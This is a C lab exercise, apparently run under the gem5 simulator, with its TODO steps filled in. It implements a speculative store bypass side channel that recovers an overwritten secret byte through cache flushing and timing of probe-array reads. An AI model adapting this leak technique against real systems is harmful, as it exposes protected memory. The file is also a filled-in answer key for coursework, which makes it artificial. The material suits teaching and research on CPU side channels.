#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>
#include <gem5/m5ops.h>

#define CACHE_BLOCK_SIZE (64)
#define L1_HIT_THRESOLD (45)
#define NUM_CACHE_BLOCKS (256)

uint8_t probe_array[NUM_CACHE_BLOCKS * CACHE_BLOCK_SIZE];
unsigned long latencies[NUM_CACHE_BLOCKS];

uint8_t secret = 123;

// TODO: Declare two pointers (store_ptr, load_ptr) pointing to one byte data
// Two pointers should not be in the same cache block
/*FILLME*/
uint8_t* store_ptr;
uint8_t dummy[CACHE_BLOCK_SIZE];
uint8_t* load_ptr;

int main()
{
    m5_set_numflush(1);
    
    volatile uint8_t junk;

    // TODO: assign an address of secret variable to both store_ptr and load_ptr.
    /*FILLME*/
    store_ptr = load_ptr = &secret;

    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        _mm_clflush(&probe_array[i * CACHE_BLOCK_SIZE]);
    }

    // TODO: Flush both load_ptr_ and store_ptr
    /*FILLME*/
    _mm_clflush(&store_ptr);
    _mm_clflush(&load_ptr);

    // TODO: install both load_ptr and secret to L1D
    /*FILLME*/
    junk ^= *(load_ptr);

    _mm_mfence();

    // TODO: Now, secret should be overwritten with random value (say 100).
    // Write 100 to secret through store_ptr
    *(store_ptr) = 100;

    // TODO: After store, program never see previous value 123.
    // But we can read it!!
    // Using probe_array, encode secret to side-channel.
    /*FILLME*/
    junk ^= probe_array[*(load_ptr) * CACHE_BLOCK_SIZE];

    for (int i = 0; i < NUM_CACHE_BLOCKS; i++)
    {
        unsigned int junk;
        unsigned long time1 = __rdtscp(&junk);
        junk ^= probe_array[i * CACHE_BLOCK_SIZE];
        unsigned long time2 = __rdtscp(&junk);
        latencies[i] = time2 - time1;
    }

    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        printf("%d: %lu, %s\n", i, latencies[i], (latencies[i] < L1_HIT_THRESOLD)? "hit": "miss");
    }

    // We must see 100 for both *load_ptr and *store_ptr
    printf("*load_ptr: %d store_ptr: %d\n", *load_ptr, *store_ptr);

    return 0;

}



